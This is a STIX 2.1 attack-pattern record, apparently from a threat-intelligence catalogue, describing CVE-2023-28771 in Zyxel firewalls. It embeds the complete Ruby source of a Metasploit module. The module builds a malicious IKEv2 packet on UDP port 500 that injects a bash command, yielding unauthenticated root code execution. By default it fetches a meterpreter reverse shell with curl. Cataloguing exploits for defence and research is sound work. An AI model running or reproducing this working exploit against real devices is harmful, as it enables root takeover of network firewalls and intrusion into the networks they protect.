{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--21a7f992-2691-430e-aa17-465c7ddd4240",
    "created": "2024-08-14T16:57:16.421532Z",
    "modified": "2024-08-14T16:57:16.421536Z",
    "name": "Zyxel IKE Packet Decoder Unauthenticated Remote Code Execution",
    "description": " This module exploits a remote unauthenticated command injection vulnerability in the Internet Key Exchange (IKE) packet decoder over UDP port 500 on the WAN interface of several Zyxel devices. The affected devices are as follows: ATP (Firmware version 4.60 to 5.35 inclusive), USG FLEX (Firmware version 4.60 to 5.35 inclusive) VPN (Firmware version 4.60 to 5.35 inclusive), and ZyWALL/USG (Firmware version 4.60 to 4.73 inclusive). The affected devices are vulnerable in a default configuration and command execution is with root privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/zyxel_ike_decoder_rce_cve_2023_28771.rb",
            "external_id": "zyxel_ike_decoder_rce_cve_2023_28771.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-28771"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/N3i8dxpFKS/cve-2023-28771/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-remote-command-injection-vulnerability-of-firewalls"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zyxel IKE Packet Decoder Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits a remote unauthenticated command injection vulnerability in the Internet Key Exchange\n          (IKE) packet decoder over UDP port 500 on the WAN interface of several Zyxel devices. The affected devices are\n          as follows: ATP (Firmware version 4.60 to 5.35 inclusive), USG FLEX (Firmware version 4.60 to 5.35 inclusive),\n          VPN (Firmware version 4.60 to 5.35 inclusive), and ZyWALL/USG (Firmware version 4.60 to 4.73 inclusive). The\n          affected devices are vulnerable in a default configuration and command execution is with root privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sf', # MSF Exploit & Rapid7 Analysis\n        ],\n        'References' => [\n          ['CVE', '2023-28771'],\n          ['URL', 'https://attackerkb.com/topics/N3i8dxpFKS/cve-2023-28771/rapid7-analysis'],\n          ['URL', 'https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-remote-command-injection-vulnerability-of-firewalls']\n        ],\n        'DisclosureDate' => '2023-03-31',\n        'Platform' => %w[unix linux],\n        'Arch' => [ARCH_CMD],\n        'Privileged' => true, # Code execution as 'root'\n        'DefaultOptions' => {\n          # We default to a meterpreter payload delivered via a fetch HTTP adapter.\n          # Another good payload choice is cmd/unix/reverse_bash.\n          'PAYLOAD' => 'cmd/linux/http/mips64/meterpreter_reverse_tcp',\n          'FETCH_WRITABLE_DIR' => '/tmp',\n          'FETCH_COMMAND' => 'CURL'\n        },\n        'Targets' => [ [ 'Default', {} ] ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          # The process /sbin/sshipsecpm may crash after we terminate a session, but it will restart.\n          'Stability' => [CRASH_SERVICE_RESTARTS],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(500)\n      ]\n    )\n  end\n\n  def check\n    connect_udp\n\n    # Check for the Internet Key Exchange (IKE) service by sending an IKEv1 header with no payload. We can\n    # expect to receive an IKE reply containing a Notification payload with a PAYLOAD-MALFORMED message.\n\n    # In a default configuration, there appears no known method to identify the platform vendor or version\n    # number, so we cannot identify a CheckCode other than CheckCode::Detected or CheckCode::Unknown.\n    # If a VPN is configured on the target device, we may receive a Vendor ID corresponding to Zyxel, but we\n    # still would not be able to identify the version number of the target service.\n\n    ikev2_header = Rex::Text.rand_text_alpha_upper(8) # Initiator SPI\n    ikev2_header << [0, 0, 0, 0, 0, 0, 0, 0].pack('C*') # Responder SPI\n    ikev2_header << [0].pack('C') # Next Payload: None - 0\n    ikev2_header << [16].pack('C') # Version: 1.0 - 16 (0x10)\n    ikev2_header << [2].pack('C') # Exchange Type: Identity Protection - 2\n    ikev2_header << [0].pack('C') # Flags: None - 0\n    ikev2_header << [0].pack('N') # ID: 0\n    ikev2_header << [ikev2_header.length + 4].pack('N') # Length\n\n    udp_sock.put(ikev2_header)\n\n    ikev2_reply = udp_sock.get(udp_sock.def_read_timeout)\n\n    disconnect_udp\n\n    if !ikev2_reply.empty? && (ikev2_reply.length >= 40) &&\n       # Ensure the response 'Initiator SPI' field is the same as the original one sent.\n       (ikev2_reply[0, 8] == ikev2_header[0, 8]) &&\n       # Ensure the 'Next Payload' field is Notification (11)\n       (ikev2_reply[16, 1].unpack('C').first == 11 &&\n         # Ensure the 'Exchange Type' field is Informational (5)\n         (ikev2_reply[18, 1].unpack('C').first == 5)) &&\n       # Ensure the 'Notify Message Type' field is PAYLOAD-MALFORMED (16)\n       (ikev2_reply[38, 2].unpack('n').first == 16)\n      return CheckCode::Detected('IKE detected but device vendor and service version are unknown.')\n    end\n\n    CheckCode::Unknown\n  end\n\n  def exploit\n    execute_command(payload.encoded)\n  end\n\n  def execute_command(cmd)\n    connect_udp\n\n    cmd_injection = \"\\\";bash -c \\\"#{cmd}\\\";echo -n \\\"\"\n\n    # This value is decoded by the packet decoder using a DES-CBC algorithm. The decoded value is written to the\n    # log file. As such the decoded value must not have any null terminator values as these will break our command\n    # payload. Therefore we use the below known good value that will decode to a suitable string, allowing the cmd\n    # injection payload to work as expected.\n    haxb48 = 'HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB'\n\n    ikev2_payload = [0].pack('C') # Next Payload: None - 0\n    ikev2_payload << [0].pack('C') # Reserved: 0\n    ikev2_payload << [8 + (haxb48.length + cmd_injection.length)].pack('n') # Length: 8 byte header + Notification Data\n    ikev2_payload << [1].pack('C') # Protocol ID: ISAKMP - 1\n    ikev2_payload << [0].pack('C') # SPI Size: None - 0\n    ikev2_payload << [14].pack('n') # Type: NO_PROPOSAL_CHOSEN - 14 (0x0E)\n    ikev2_payload << haxb48 + cmd_injection # Notification Data\n\n    ikev2_header = Rex::Text.rand_text_alpha_upper(8) # Initiator SPI\n    ikev2_header << [0, 0, 0, 0, 0, 0, 0, 0].pack('C*') # Responder SPI\n    ikev2_header << [41].pack('C') # Next Payload: Notify - 41 (0x29)\n    ikev2_header << [32].pack('C') # Version: 2.0 - 32 (0x20)\n    ikev2_header << [34].pack('C') # Exchange Type: IKE_SA_INIT - 34 (0x22)\n    ikev2_header << [8].pack('C') # Flags: Initiator - 8\n    ikev2_header << [0].pack('N') # ID: 0\n    ikev2_header << [ikev2_header.length + 4 + ikev2_payload.length].pack('N') # Length\n\n    packet = ikev2_header << ikev2_payload\n\n    udp_sock.put(packet)\n\n    disconnect_udp\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2023-03-31",
    "x_mitre_platforms": [
        "%w[unix linux]"
    ]
}